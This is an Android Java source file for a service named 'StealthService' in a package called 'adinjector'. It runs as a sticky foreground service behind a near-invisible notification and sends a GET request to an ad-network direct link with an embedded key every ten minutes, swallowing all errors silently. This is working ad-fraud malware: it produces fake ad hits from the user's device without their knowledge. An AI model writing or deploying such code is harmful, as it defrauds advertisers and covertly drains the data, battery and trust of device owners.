package com.example.adinjector;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Timer;
import java.util.TimerTask;

public class StealthService extends Service {
    private Timer timer;
    private final int INTERVAL_MS = 10 * 60 * 1000; // 10 minutes

    // Aapka Adsterra direct link yahan set kar diya gaya hai
    private final String AD_DIRECT_LINK = "https://www.profitableratecpmnetwork.com/hdk2jkb1tq?key=1811747717fba27cc8d799ee6913935e";

    @Override
    public void onCreate() {
        super.onCreate();
        
        // Run service in foreground
        startForeground(1, createDummyNotification());

        // Start periodic link hit timer
        timer = new Timer(true);
        timer.schedule(new AdLoadTask(), 0, INTERVAL_MS);
    }

    private class AdLoadTask extends TimerTask {
        @Override
        public void run() {
            try {
                URL url = new URL(AD_DIRECT_LINK);
                HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                connection.setRequestMethod("GET");
                connection.setConnectTimeout(10000);
                connection.setReadTimeout(10000);
                
                // Request hit karne ke liye
                int responseCode = connection.getResponseCode();
                connection.disconnect();
            } catch (Exception e) {
                // Background mein errors silently ignore ho jayengi
            }
        }
    }

    private android.app.Notification createDummyNotification() {
        android.app.NotificationManager nm = (android.app.NotificationManager) getSystemService(NOTIFICATION_SERVICE);
        String channelId = "ad_injector_channel";
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            android.app.NotificationChannel channel = new android.app.NotificationChannel(
                    channelId, "Ad Injector", android.app.NotificationManager.IMPORTANCE_NONE);
            channel.setShowBadge(false);
            nm.createNotificationChannel(channel);
        }
        return new android.app.Notification.Builder(this, channelId)
                .setOngoing(true)
                .setSmallIcon(android.R.drawable.sym_def_app_icon)
                .build();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (timer != null) {
            timer.cancel();
        }
    }
}
